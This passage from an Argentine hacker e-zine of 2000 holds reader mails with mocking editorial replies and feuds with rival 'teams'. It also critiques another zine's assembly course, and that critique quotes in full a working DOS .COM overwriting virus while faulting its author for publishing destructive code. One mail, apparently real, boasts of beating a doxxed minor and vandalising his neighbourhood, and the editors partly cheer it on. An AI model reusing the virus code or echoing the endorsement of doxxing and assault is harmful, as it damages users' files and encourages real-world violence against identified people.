aclaraciones, y dando una respuesta. Gracias a todos los que nos escribieron, ya sean palabras de
aliento, colaboraciones, aclaraciones, insultos, etc etc.
Los comentarios mios a los mails iran entre [ ]. El texto de los mails esta sin cambiar, o sea,
es una copia textual del original. 
 Ahora, vamos a los bifes: 

<< ATENCION! NOTA DEL EDITOR: Los comentarios mios (de EL_NONO) van entre << >> para que no
queden dudas!! >>

-------------------------------------------< 01 >------------------------------------------------
From: el Dark
Subject: El Perfil de un Lammer: [Hellraiser]

Mas material para la ezine... esto es todo veridico, a parte, quien va a pensar q esto es 
mentira, estamos hablando de hellraiser..

Cambiando de tema, muy buena su zine me re cague de risa un buen rato.

[Gracias, aca nos manda un log de una conversacion bastante interesante con [Hellraiser], que 
sera obviamente publicado en la seccion de logs.]

-------------------------------------------< 02 >------------------------------------------------
From: Hell raiser 
Subject:

Lean el attach.

Saludos

[Y Hellraiser tenia que dar la nota, nos hace leer el attach, puff, bueh, supongo que vale la 
pena, asi que aca abajo esta el attachment que mando, que vendria a ser el texto del mail]
<< seguramente [Hellraiser] se pensara que no escanean el attachment... joven iluso >>

Estimado Editor de AZ,
[Nos estima, que amable, o mas bien, que raro!]
		       Primeramente, hola, soy [Hellraiser].
[Con confianza, a esta altura podemos decirte Pablito]
Queria "felicitarte" por el Ezine,
[Felicita a todos los que colaboraron, pero realmente no veo porque las felicitaciones, aunque 
las " " me dicen que algo hay oculto detras de eso...]
esta bien que me equivoque
[No, esta mal, sobre todo cuando lo publicas internacionalmente]
(lo admito y lo admitire) y que me equivocare, porque como vos
soy un ser humano, esta bien que me juzgues por mis actos, porque
asi debe ser, esta bien que los des a conocer... pero sin usar
un lenguaje ofensivo contra mi no?
[Gracias, hace mucho que no me decian ser humano, pero es la primera vez que admitis que te 
equivocas en realidad, por eso te lo tuvimos que marcar nosotros. Y lo del lenguaje ofensivo, 
bueno, es que haces cada cosas, que no hay otra forma de decirlo]
Este E-Mail te lo mando sin bronca, sin rencor, y para que
lo publiques, porque mediante esto pido disculpas al mundo por
si algo he hecho mal... yo simplemente hago y digo lo que pienso
en ese momento.
[¿Te quedan dudas de si hiciste algo mal?, Y no me refiero solo al Nuclear Blast ese que no anda
ni para atras, no no, me refiero a las otras cosas]
Hay muchas cosas ciertas en sus comentarios contra mi, pero tambien
hay otras equivocadas.
[Aca deberias haber puesto una lista de las equivocadas, por favor, correginos en nuestros 
errores]

Cordiales Saludos.
[Si, bueno, igualmente]

[Hellraiser]
[Notese que la firma no es comentario mio]

-------------------------------------------< 03 >------------------------------------------------
From: 
Subject:

[Este fue un mail vacio que recibimos, solo lo aclaramos porque vino con un log de regalo, y lo
agreadecemos al que haya sido, tambien sera publicado en la seccion de logs.]

-------------------------------------------< 04 >------------------------------------------------
From: 
Subject:

[Otro sin remitente ni subject, pongan algo aunque sea, gracias igualmente]

Domain Name: SET-EZINE.ORG

Administrative Contact, Billing Contact:
Calvo, Rodrigo (RC18895) nocilla@WWDG.COM
SET, Saqueadores Edicion Tecnica
Lamercillos 31337
Record last updated on 23-Feb-2000.
Record expires on 15-Aug-2001.
Record created on 15-Aug-1999.
Database last updated on 16-Apr-2000 00:11:37 EDT.

Se ve que les modificaron el dominio a los de set, curiosa calle, la lamercillos.

[¿Te parece?, mas bien creo que lo pusieron ellos en chiste, pero quien sabe]

-------------------------------------------< 05 >------------------------------------------------
From: servicio80
Subject: sobre az .alucinante!!!

hola a quien reciba este mail.
[Ese soy yo!, hola]
acabo de leer el articulo de antilamer donde hablan de 
todos los pendejos de ciudad ej hellraiser, etc.etc
y me parecio fabuloso,
no dijiste una palabra de mas ,por ahi te entusiasmaste 
un poquito pero todo bien,
[Si, bueno, trata de leer todos los articulos de Hellraiser, visitar la pagina de eskracho, SIDE,
bajar scripts, y todo eso, y despues escribi un articulo a ver como te sale, realmente hubo 
entusiasmo, pero esta justificado]
el punto es pára usrtedes de az es que me gustaria 
contactarlos en algun irc o donde sea que se
[A diferencia de lo que cree Caos, no andamos por canales de IRC haciendonos los chicos malos, 
no nos vas a encontrar en el IRC] 
<< Buscanos en una BBS (de las conocidas... no doy mas datos) ;) >>
junten,porque a mi lo que mas me interesa es el 
aprender sobre linux, y todo lo que deriba de el , pero 
como ustedes saben ahi en ciudad en los canales de 
esos pendejos , lejos estoy de aprender algo, mas que 
verlos hablar boludeces , ke ese tiempo ya paso para mi 
dento del irc.
[Si, bueno, pero ni nosotros, ni Antilammer Zone, estan con el objetivo de enseñar Linux, por lo 
menos no en este momento y en estas circunstancias, pero en varias zines (por ej SET) salen a 
veces buenos articulos del tema, y sino, podes buscar en Internet, que esta lleno de excelentes 
textos que enseñan todo sobre este sistema operativo.]
asi que les pido que ya que encuentro gente que 
opiensan igual que yo , y creo poder ver una luz de 
sabiduria para mi en lo concerniente a linux, me 
encantaria conectarem con ustedes ,y espero que lo 
hagan ,de esa forma me demostraran (tampoco tienen la 
obrigacion ) de que la informacion debe ser libre y 
t4ransmitida, y se los agradeceria muchisimo, porque lo 
que yo quiero hoy es aprender, espero reciban y me 
transmitan donde poder juntarme con ustedes, gracias y 
espero que representen a l under bien asi como lo 
defienden en los articulos de az . un saludo y espero 
noticias ,.gracias.

[De nada, bueno, nunca dijimos que nosotros supieramos de Linux, ni que nos dedicaramos a 
enseñarlo, como te dije, esta lleno de gente que si lo hace. La informacion debe ser libre y
transmitida, es verdad, pero si queres articulos sobre Linux en AZ no los vas a encontrar, ya que
no es el objetivo de esta E-Zine transmitir conocimientos sobre Linux.
 Lo que te recomiendo es que busques paginas sobre el tema, y tambien podes frecuentar newsgroups
que a pesar de estar llenos de gente que lo unico que quiere es compilar un nukeador, tambien
hay gente que sabe mucho del tema. 
Gracias por las palabras de aliento, y nos alegra que te gustara AZ. Un saludo tambien para vos]

-------------------------------------------< 06 >------------------------------------------------
From: Morpheus
Subject: GILRAISER TIENE 2 DIENTES MENOS

Queridos Amigos De Anti-lammer Zine :
[La Z es de Zone en realidad, pero se acepta zine tambien]

Mis queridos muchachos , soy Morpheus (op del canal #springfield del Irc de
ciudad Argentina) y queria contarles mi experiencia : este tal [Hellraiser]
una vez trato de tomarme el canal con insultos varios , resalto el TRATO
[¿como se toma un canal insultando?, bueno, supongo que viniendo de [Hellraiser]...]
pues no pudo ya que nuestros operadores saben que hacer en estos casos.
yo soy una persona muy vengativa y gracias a su zine me entere el nombre
verdadero y su direccion
[¿Nos queres hacer sentir culpables?, bueno, despues de todo, como bien dijo el anterior, la
informacion debe ser libre y transmitida, bien por ti]
 , luego de un tiempo hice averiguaciones sobre el y
[Ese es el espiritu!]
resulta que es hijo de un consejal de San Isidro (Zona Sur de Buenos Aires)
o sea es un nene con cuchara de plata en la boca que quiere ser hacker por
que "papi" no le presta atencion por su trabajo.
[Exactamente, no quisimos meter al padre que no tiene la culpa, pero ya que lo mencionaste si,
efectivamente es consejal de San Isidro. Y es muy posible que sea un nene mimado, tiene todos
los sintomas]
<< San Isidro (Zona Sur de Buenos Aires)?????? WRONG! es zona norte... >>

Me tome la libertad de irme hasta San Isidro y molerle su cara de idiota
[No te culpo, todos pensamos en hacerlo alguna vez, pero cuando te enteras que es un nene de papa
y todo eso, uno se queda pensando si no le dara un infarto ante el cagazo de una apurada, y es
menor de edad, y nadie quiere ir preso por trompear a un pendejo]
(Soy muy resentido) y de escracharle el barrio con frases del tipo "PABLO
SOS UN TREMEDO CHUPA PIJAS" o "Hellraiser virus ha sido reparado Por
Morpheus Antivirus " y demas cosas
ya se que la violencia no lleva a nada pero golpearlo fue tan divertido
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
[Me imagino la diversion, no fomentamos la violencia, pero si vos considerabas que se lo merecia,
cada uno es libre de molerle la cara de idiota al que quiere. Aportaste tu granito de arena]
<< No creo que el PUNCH THE LAMMER!!! sea la solucion, al contrario, asi te identificas como un
antilammer en una sociedad lammer, considero que es un camino equivocado. >>

MORPHEUS

morpheus666@ciudad.com.ar 

PD : SU ZINE ES FANTASTICO CONTINUEN ESCRACHANDO LAMMERS 
[Muchisimas gracias, no lo ibamos a hacer, pero realmente sentimos que deberiamos seguir]
PD2 : COLABORE A LA ANTI-ESTUPIDES , GOLPEE UN LAMMEER TODOS LOS DIAS 
[¿Todos los dias?, el sueño del pibe...]
PD3 : Down With The lammers
[Eso mismo, y gracias por contarnos esto]

-------------------------------------------< 07 >------------------------------------------------
From: Giba
Subject: Molesto
[Este Giba es miembro de Eskracho Team (geeek, me produce un sensacion rara escribirlo ya.]
<< Sherman, 2 faltas, es E->z<-kracho, con z, y cerra el parentesis!... esto es para aquellos que
dicen que porque no nos criticamos entre nosotros tambien. >>

Saludos:
[Saludos]
                Despues de leer el numero 1 de su anti-lammer zine me he dado cuenta de muchas
[Una vez mas, la Z es de zone, pero no hay drama] 
cosas: Pablo, que se canchereaba con sus codigos en C, escribe virus de pibes de cuarto grado y
[No creas, hay pibes de cuarto grado que escriben muy buenas cosas, no los pongas al mismo nivel.
Para el que todavia no esta enterado Pablo es [Hellraiser]]
CaoS que se canchereaba de su HTML a mano se copia los diseños. 
[Encima canchereaba?, esa es nueva, como si un HTML tuviera mucha ciencia, a mano o con 
Frontpage, un HTML es una cosa simple, no es una hazaña escribirlo a mano]
Ustedes desde afuera solo se dan 
cuenta de unas pocas lammereadas, yo les conozco muchas mas y ni se imaginan que tan lammers 
(muy lamers). 
[Me estas asustando, ¿hay mas?]
Pero no me gusta que esten asi generalizando y atacando de esa forma. 
Admito que 
somos nuevos,
[Vos lo admitis, Pablito y sus amigos no, dicen que llevan los hilos] 
yo por mi parte, en ningun momento dije que soy hacker ni nada de eso, 
[Tampoco nosotros dijimos nada de vos, si del "team", si vos no realizas las mismas actividades
que el mismo, no se que haces ahi.]
yo me uni 
porque crei que de esta forma iva a poder aprender un poco. Si no fuera por ellos no sabria ni 
hacer un ls,
[Escribis ls en el prompt y apretas enter] 
<< el iva es del 21 %... cavallo hijo de puta... y proba con el -f ;) >>
o peor, ni siquiera tendria linux.
[Como si tener linux fuera gran cosa] 
<< no para negro... wow... linux... estas en el cielo! >>
Que critiquen los textos me parece muy bueno, pero no de la forma en que lo hicieron; 
generalizando diciendo esos lammers pu*70s de ezkracho...
[Ese *70 es una forma elitista de escribirlo?, o es una combinacion nueva para marcar en el 
telefono y obtener algun servicio?] 
yo soy de ezkracho, no digo que soy 
hacker ni que soy super y la verdad es que me gusto mucho su zine y las criticas incluidas.
[Gracias, ya te dije que nunca dijimos nada de vos especificamente, pero si del "team"]
<< "team" da ezkalofrios! >>
En fin, creo que lo que hacen esta bien pero no la forma en que lo hacen. Ademas, creo que este 
grupo es MUY nuevo, y esta creciendo junto, nadie nace sabiendo y esta es una buena forma de 
aprender. 
[si, es muy nuevo, pero no empezaron con humildad, como empezaron todos, empezaron dicendo que
son los que llevan los hilos del hack en Argentina, y una monton de boludeces mas]
Yo me dedico a programar, y que antes de haber aprendido C haya pasado por el gwbasic, 
el qbasic, el visual basic, el euphoria no me molesta, me parece buena base para cuando quiera 
seguir con asembler.Si se dan cuenta con ese ejemplito, antes de hackearse la nasa hay que 
primero pasar por otros pasos en los cuales se que estoy actualmente o los he pasado: opearse
en el irc, nukear, ping flood,back orificce, mails anonimos con telnet, mail bombs,.... para 
despues poder seguir siendo un port surfer, PHF, usar el netbios, .... y por fin, revisar 
sistemas, escarbar en las configuraciones, buscar errores y generar uno mismo su exploit, 
borrar todas las huellas y no decirle a nadie -- osea -- hackear. 
[Estas un poco equivocado, para ser hacker no hay que pasar por tomar canales, ni nukear a
cualquiera que este chateando inocentemente, ni floodear la conexion de alguien que no hizo nada
malo, mas que ser op en un canal, ni llenarle la casilla de mail de basura a alguien, anulandole
el derecho a la comunicacion. Si empezaste asi, empezaste mal.]
<< Giba, pensas que todos seguimos tu camino? cada quien se hizo de manera distinta. >>
A mi me parece que es un 
camino por el que todo hacker ha estado transitando ya sea por mas o menos cantidad de tiempo 
pero siempre se supera a menos que se abandone; supongo que no tendran objecion a eso.
[Ya te dije la objecion, que si la tengo. Ademas, si ustedes estan en las primeras etapas, 
¿como permiten que un miembro de su grupo ande diciendo que son los que llevan los hilos del
Hack de un pais?]
<< NO estoy de acuerdo para nada con lo que decis Giba... o tengo que decir 6184? ;) >>
Me gustaria en el futuro de su zine no solo ver criticas y puteadas que solo dicen que 
--< pusiste que X es Y , LAMMER >-- , sino que digan -<esto esta mal, informate bien en 
www.informate.com >- por ejemplo.
[Todo Hacker debe saber como minimo buscar informacion por su cuenta, usar altavista como minimo,
y ya que dicen que son Hackers, que hagan honor al titulo, no tenemos porque ser nosotros quienes
le pasamos bibliografia]
Ademas en los articulos que hablan de una opinion personal, no pueden discutir mucho, es PERSONAL
y cada uno debe sacar sus concluciones.
[No creas, las opiniones estan para discutirlas, sobre todo si son absurdas]
<< Segun la filosofia de Giba, todos debemos tener la opinion personal pero jamas expresarla. >>
Perdonen por hacerlos leer tanto.
[Fue bastante molesto, pero en fin, justo me agarraste en uno de esos dias en los que uno no
tiene mucho que hacer, o no se siente como para hacer lo que deberia, y tiene que esperar un 
llamado, que por cierto, NO LLEGA!!!!!!]
 
Saludos, GiBa.
[Igualmente]

-------------------------------------------< 07 >------------------------------------------------
From: punisher_z
Subject: relammers

VOY A SER RAPIDO Y SINCERO, 
[Uff, gracias, porque antes del tuyo tuve que leer el de GiBa, y no fue tan considerado]
UDS. SON LA MAYOR MANGA DE 
LAMMERS QUE LEI, 
[Entonces deberias darte una vuelta por los sites de Eskracho y SIDE team, o los Phantomas team]
<< ah si? por? >>
Y NO SABEN HACER OTRA COSA QUE 
CRITICAR A PEQUEÑOS GRUPOS QUE ESTAN EMPEZANDO.
[Si pensaras un poco, te darias cuenta que las cosas que criticamos son completamente 
inaceptables, no criticariamos si dijeran que recien empiezan y eso, pero si criticamos, porque
segun ellos son los que llevan los hilos del Hack en Argentina, y las cagadas que se mandan son
inaceptables en un grupo que maneja el Hacking de un pais]
<< No solo lo de los hilos Sherman, hay miles de cosas que criticamos en AZ 1 >>
ESTOY EN ESTO DESDE HACE VARIOS AÑOS POR LO QUE CREO 
TENER EL DERECHO DE PODR DAR MI OPINIÓN,
[Si lo estas o no es cosa tuya, aunque no lo estuvieras tendrias derecho de opinion, cualquiera
puede opinar]
<< punisher_z podes escribir? si por lo que veo (y lo haces en mayuscula, asi que debes ser un
pendejito griton), entonces podes dar tu opinion. >>
CREEN QUE TANTO CRITICANDO VAN A ENTRAR, PERO ESA NO ES 
LA FORMA.
[¿Entrar?, ¿Te parece que estamos intentando entrar?, me parece que confundiste las intenciones.]
<< Entrar???? no no para, esperame que estoy llorando de la risa... bueno, ya se me paso, entrar
a donde? acaso esto es un boliche? del cual seguro te crees el dueño claro, autentico gil. >>
VI TU FOT HELL... MIERDA QUE SOS FEO.
[Ja, este comentario salvo el mail, si si, estamos de acuerdo, pero no es justo criticarlo por su
apariencia fisica, que no es lo que importa en el under, sino por sus acciones, deberias saberlo
si estas hace tanto]
<< che puni, si por esas casualidades nos llega la tuya, prepara el tarro como dice Vaselin. >>

PUNISHER
[Castigador, ¿Sadomasoquista?, ¿pegame y decime cacho?]
<< punisher, a vos si que no te hace falta el titulo al idiota. >>

--------------------------------------------<END>------------------------------------------------

Sherman.
<< Comentado por EL_NONO >>

-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-

-<07>-

  S_K (C) NH community 2000 Dept. de VIRII... Como copiar a DaN >-

[estaba leyendo la DP3, que me parecia mas que buena con respecto a otras que ya aparecieron en
AZ y no tenia falta alguna hasta que...]

 Daemon's Paradise 3, Articulo 3 en File 3x03.txt.
 CURSO DE ASM (1ª entrega)
 por S_K - s-k@bigfoot.com

[... a ver a ver ... del articulo en si no voy a opinar, cada quien explica a su forma y a su
antojo lo que quiera. Peeeeero al llegar a la firma...]

Un saludo de S_K.

byez aLL

(C) NH community 2000
Dept. de VIRII

[... Dept. de VIRII !!!! ... es muuuuy copiado de Digital Anarchy ... comprendo que lo bueno
queda y persiste, pero S_K, se un poco mas original ...]

[no es solo eso, por eso solo no habria de hacer un articulo, se ve que como anexo, metio dos
'virus', que el primero un com overwriter y el segundo un com infector usando appending method,
que no estaria mal, sino fuera porque el overwriter, no esta presentado asi]

; Infecta archivos .COM menores o iguales a 45 bytes
;by S_K

[dejemos de lado el by S_K, que puede ser que el mismo lo haya hecho, porque es una gilada total,
pero lean atentamente, infecta archivos com menores o iguales a 45 bytes... vean el codigo]

comienzo:         
                     mov ah,4eh                ;funcion buscar archivo
                     mov dx,offset tipo        ;puntero dirigido a tipo

buscarabrir:
                     int 21h                           
                     jc final                  ;si no encuentra archivo finaliza programa
;(bit de acarreo en 1), si lo encuentra continua (bit de acarreo en 0)
         
                     mov ax,3d02               ;funcion abrir archivo
                     mov dx,9eh                ;selecciona los datos DTA del archivo encontrado
                     int 21h           
                     jc cerrar                 ;si ya esta infectado cierra archivo (bit de
; acarreo en 1) y busca otro, si no esta infectado (bit de acarreo en 0) continua

                     xchg bx,ax                      ;mete los datos del registro AX en BX para
; que no los muestre al final del programa en la ventana del mismo

                     mov ah,40h                      ;funcion de copiar codigo
                     mov cl,longitud                 ;indica en el registro del contador la
; memoria que ocupa el virus
                     mov dx,offset comienzo     ;puntero indicando desde donde se debe copiar
                     int 21h 

cerrar:
                     mov ah,3eh                       ;funcion cerrar archivo
                     int 21h

                     mov ah,4fh                        ;funcion buscar otro archivo
                     jmp buscarabrir                 ;salta a buscarabrir para iniciar la
; busqueda de un nuevo archivo

final:
                     int 20h                             ;sale al dos

tipo db          '*.COM',0                            ;tipo de ficheros a buscar e infectar

theend:
longitud         equ offset theend - offset comienzo   ;indica la memoria que ocupa el virus

[donde chequea la longitud del archivo a infectar??? S_K, lo que hiciste es digno de publicarse
aqui, en az, pues si un newbie, que es a quien le dirijes el articulo, compila y ejecuta este
file sobreescribira todos los .com en el directorio actual y eso sin saberlo. Fue muy lammer de
tu parte, no se que querias lograr con ello, quizas hacerte el muy malito, no se. Espero que
recapacites. Y recuerda que solo has hablado en tu articulo de asm, sobre un poco de funciones,
y nada mas, osea que ningun newbie que lea eso podra entender lo que escribiste en esos
'viruses' y menos si le dices que solo infectara archivos de 45 bytes como maximo y luego en
los comentarios ni siquiera camuflas algo, que seria aun mas lammer, pero al menos tendrias
estilo.]

Vaselin; "comprate un tarro porque aca llegue yo"

-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-

-<08>-

  Lo que se dijo, Boards Comentadas >-

 Despues de la publicacion de AZ 1, muchos saltaron a criticarnos, lo cual me parece bien, pero
no que nos pongan palabras en la boca. Esto es algo asi como una respuesta. AZ 2 no estaba 
planificada para salir, pero creemos que es necesario editarla, recibimos muchas palabras de 
aliento, comentarios, y colaboraciones, y no creemos conveniente que se pierda el esfuerzo de
muchos. Lo que esta entre [ ] son comentarios mios.

-------------------------------------------------------------------------------------------------

[Publicado en la pagina principal de "Ezkracho Team"]

Los chicos malos del IRC ...
[Lindo titulo nos pusiste, ¿cuantas veces nos viste en el IRC?]  
Escrito por CAOS el 24/03/00 

Hay gente que se nota que no tiene absolutamente nada que hacer, y pierde su tiempo en cosas 
totalmente improductivas. 
[Vos escribiendo esto te incluis, no?]
Un grupo de "chicos malos del IRC" por no llamarlos de otra manera,
[Asi se llamarian ustedes, todo el dia en canales de IRC, no creo que hayas visto a ninguno de 
nosotros en el IRC, y si nos viste, eran otros con nuestros handles] 
creo un ezine llamado AntilammerZone, este ezine esta dedicado exclusivamente a criticar 
esfuerzos ajenos y catalogarlos de "lammers". En su primer número se centraron casi 
exclusivamente en criticar y ofender a varios grupos de Seguridad Informática, como ser Ezkracho,
 SIDE, Digital Rebel o SET, y en particular a algunos miembros de estos. Sus críticas que si 
fueran solo eso serían bienvenidas, son ofensas de muy bajo nivel y puras mentiras; 
[Porque no enumeras las mentiras?]
creo que si 
hubieran querido hacer verdaderas criticas constructivas todos las hubieramos aceptado de buena 
manera mas alla de que no nos agraden, pero esta gente vuelvo a repetir se rebajo a insultar de 
muy mala manera y realizando otros actos que dejan mucho que desear...
Quiero aclarar que Ezkracho Team no roba absolutamente nada, ya sea source de programas o textos,
 y si hemos basado nuestro trabajo a partir de otro como es la filosofía GNU ha sido siempre 
dando los debidos creditos (por favor lean nuestro FAQ). Y queremos aclarar que desde Ezkracho 
repudiamos todas las mentiras hechas hacia nosotros como hacia los demas Team's.
Por ultimo quiero instar a "esta gente" a que dedique su esfuerzo y su tiempo en hacer cosas que
realmente les den un beneficio intelectual, y no una perdida de tiempo como significa lo que 
estan haciendo.
Y finalizando si alguien quiere ver la decadencia de estas personas, las mentiras, y por 
supuesto "reirse muchisimo" porque no deja de ser gracioso, la URL de "estos chicos malos" 
es: antilammer.freehosting.net

[No hay mucho que decir al respecto, hacia SET como reiterare varias veces, no los insultamos,
en mi opinion hacen muchas cosas buenas, y no los considero lammers, solo que hicieron algo que
a nuestro parecer no fue lo correcto, y se dio una opinion al respecto, nada mas.]

-------------------------------------------------------------------------------------------------

La ignorancia esta de moda  
   
¿Tienes ganas de reir? Pues nada mejor que irse a bajar antilammer zone, el ezine de la 31337 
que os avisa de que estamos llenos de *lammers*, como los grupos SET, ezkracho, etc, etc.
[1) Seria el ezine anti 31337, estamos en contra de los que se dicen "elite", 2) Nunca dijimos 
que SET fuera un grupo de lammers] 
Bueno, desde aqui permitanme comente lo que es ese *ezine* y que son sus colaboradores, no 
puedo aguantar. Veamos, que promulga a los 4 vientos ese penoso .txt?? que los grupos que antes
he mencionado y muchos mas grupos de la scene asi como algun particular son unos lammers 
acabados. Comenzamos mal, que yo sepa nadie que haya sido nombrada en ese .txt (es que no se 
como llamarlo...) es un lammer, a diferencia de todo el equipo de antilammer zone. He de 
reconocer que despues de leerme a duras ese .txt motivado por mis ganas de reir no he encontrado 
ningun dato que catalogue a estos grupos como lammers, ni mucho menos, es mas, la ignorancia del
equipo (o lo que sea) del antilammers zone se puede comparar a sus penosos articulos, lo que no 
los convierte en los mas apropiados para juzgar a nadie. Desde aquí un saludo a Zomba, a todos 
los miembros de SET, de Digital Rebel, de Heh!, a todos los que injustamente han sido nombrados 
en esa basura a la que llaman ezine... Y decirles que animo, y que no hagan caso de todas las 
estupideces que se pueden escribir en 117K llenos de ignorancia. Por cierto, si quereis bajaros 
semejante obra de arte podeis dirigiros a http://antilammer.freehosting.net/

" Antilammers zone. Tombola ya esta en internet. "

[Uh, que miedo, Tombola. Si no entendiste porque dijimos que algunos son lammers, creo que no 
leiste bien, la mayoria entendio el mensaje, y estuvo de acuerdo, incluso se sumaron a la cruzada
para detener a los grupos de pendejos que se creen dioses, y disminuyen a aquellos que en 
silencio realmente hacen cosas buenas.]

-------------------------------------------------------------------------------------------------

Estos fueron dos articulos en message boards que realmente resumen todas las malas criticas que
recibimos. Tienen en comun la mala interpretacion del mensaje hacia SET, que tenia mas de 
consejo y opinion que de critica, y no tenia nada de insulto. El resto, creo que se lo tienen
bien merecido.

Sherman.

-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-

-<09>-

  Clarin, Informatica 2.0, "Dele de comer a los Lammers" >-

  Creo que el nivel de este suplemento es terrible y asquerosamente bajo. Tienen un foro de
discusion en el que debaten diversas cuestiones. A principios de Julio creo que fue, se hablo
sobre quienes eran los creadores de virus.
  Claro, ante una discusion como esta, hubo muchos que hablaron de las empresas antivirus y de
otras supuestas fuentes. Pero entre las opiniones, habia muchisimas esvozadas por completos
lammers y/o desubicados totales.
  Frases como:

"Particularmente me resulta difícil de creer que un paquistaní esté en condiciones de armar y
distribuir un virus informático como "I love you", "Melissa" o similares."

  o leer al moderador llamar alimañas informáticas a los virus lo dejan a uno desmoralizado y
sin esperanzas de que este mundo cambie.

  Pero todo no termina ahi, si quieren leer LA VERDAD, lean a este MAESTRO (de la ilusion)...

                                        "Los virus informáticos, en general se cree que se crean 
con malos propósitos, pero esto habitualmente no es así. Podemos clasificar los virus de fuentes 
buenas o de fuentes malas. Los de fuentes buenas son aquellos creados con buenos propósitos pero 
que luego derivan a virus que hacen daño. Fuentes buenas: 1) los programadores de soft, cuando 
crean algún programa nuevo que tienen que salir a vender, en general crean algún virus específico 
para el programa, de esta manera instalan su programa en un potencial cliente y lo dejan 
funcionando, si el cliente lo compra al producto el programador desactiva este virus, si el 
cliente no lo compra, este virus se activa borrando el programa después de un tiempo o avisando 
que va a borrarlo, lo que da tiempo al cliente para comunicarse y comprarlo definitivamente. 
Luego, si alguien se apropia de estos virus los muta a malos. 2) Otra fuente de creación son las 
variaciones de programas que no son virus en su inicio, pero que al tener opciones de borrado, 
reemplazo de archivos, o llenado de pantalla, se mutan a virus que sí provocan daños. 3) Los que 
hacen las propias empresas de soft para protegerse de otras empresas de soft. 4) Los que hacen 
los gobiernos para defenderse del terrorismo o de otros malos gobiernos. Fuentes malas: 1) 
Creados al efecto para causar daños.
2) Recreaciones de virus de fuentes buenas. 3) Recreaciones de virus de fuentes malas. 4) Cuando 
los programadores o aprendices son echados malamente de algún trabajo y en vez de hacer un 
formato del sistema, dejan anidando un virus que explota después. 5) Los que hacen las propias 
empresas de soft para pelear deslealmente con la competencia.
El gran problema es que hay fuentes buenas de virus y eso hace que continuamente se estén 
diseñando virus, que en malos usos causan muchísimo daño. De allí la noticia mala es que en el 
futuro seguramente existirán grandes guerras informáticas y seguramente habrá una gran guerra 
mundial informática. La noticia buena, es que por ahora no va a suceder, todavía no existe una 
gran convergencia tecnológica, por lo que hay muchos medios sustitutos, hay muchas intranets por 
lo que hay grandes compartimentos estancos, y eso que sale en las películas de que hay una sola 
clave para acceder a algo, es utópico, hay miles de claves, porque son grandes sistemas donde 
para cada compartimento hay una llave, no hay una única gran llave."

  Hacen falta comentarios? no creo, es una obra maestra lammer. Pero que es un universitario no
tengo dudas, quizas sea profesor o seguro tiene un titulo de ingeniero en sistemas o esta por
conseguirlo, seguro que lo saca y con 10 de promedio. Ah!! pero eso no termina ahi! con suerte
pone un server en el que vende servicios de seguridad informatica, porque... es un experto,
alguien lo duda?

Vaselin; "comprate un tarro porque aca llegue yo"

-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-

-<10>-

  NextVision, "Especialistas en Seguridad Informatica" >-

  Con todo ese lio del LifeStages (un VBS worm en un .SHS) crecio la histeria y los sitios de
news tuvieron mas material para rellenar sus paginas.
  Es logico que los worms que se mandan por mail y saturan los smtps den laburo a los supuestos
"especialistas" para desinfectar los sistemas, pero muchachos, todo tiene un limite...
  Me encontraba leyendo las noticias y de pronto cai en NextVision donde se decia que Zulu, el
creador del worm LifeStages, es un cracker... SI!!! un cracker!!! increible, pauperrimo nivel el
de estos pibes que se lanzan a hablar sin saber, pero eso no es lo peor... como saben este es un
mundo lleno de lammers, pero lo que colma la paciencia y es que hay un cartelote en la pagina que
dice NextVision "Especialistas en Seguridad Informatica"... basta de estupidez chicos, si son
linux y script kiddiez no hablen del vx development, porque quedan muy pero muy ridiculos.

Vaselin; "comprate un tarro porque aca llegue yo"

-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-

-<11>-

  CIA's Zines, Un denominador comun? >-

  Paranoid Zine, dice CIA's Hackin Zine, es de Junio de 1997.
  Ahora salio una tal CIA Zine, de un tal CIA Team, de un solo integrante, un tal Dr. Nuk3m, no
podria haberle puesto un nombre que no existiera ya? Si bien tecnicamente no era asi, se dejan
ver cosas que quizas no sean, como que este tal Dr. Nuk3m sea uno de los antiguos editores de la
Paranoid Zine, quien sabe...

Gelsito

-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-

-<12>-

  Kebracho Team, Grupo dedicado a ridiculizar a los de Ezkracho >-

 Este articulo esta dedicado a hablar sobre el Kebracho Team. El Kebracho Team no es lo que
parece. En realidad, no es un Team que se denominan Hackers, al mejor estilo Ezkracho. Sino, un
grupo dedicado a ridiculizar a los de Ezkracho. Recomiendo su pagina, asi como mucho de su 
material. No digo que este de acuerdo con todo lo que hacen, pero me parece que a su manera
estan sumandose. Mucho de su material es excelente. Quiero aclarar que ninguno de los miembros
de Kebracho Team tiene o tuvo relacion alguna con el equipo de AZ.
 La pagina esta basada en el diseño de la de Ezkracho, de hecho, es una ridiculizacion de la 
misma. Como critica, se podria decir que podrian cuidar mas los detalles, como links muertos, y
faltas de ortografia en muchos de los textos. Esta todo hecho muy a los apurones, no digo que 
deban revisarlo 1000 veces, pero quizas quedaria mejor si estuviera mas cuidado. De todas formas,
valoro mucho lo que hacen, y desde aqui, les digo, sigan con ese esfuerzo, entre todos, podemos.
No nombrare miembros ni nada de eso, lo dejo para que lo vean ustedes mismos, la URL de su
pagina es: www.kebracho.cjb.net
 Recomiendo que la visiten.

<< Nota de EL_NONO: Incluyo en el archivo kebracho-txt.zip los textos que hay hasta el momento
en la pagina, para que tengan una muestra! >>

Sherman.

-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-

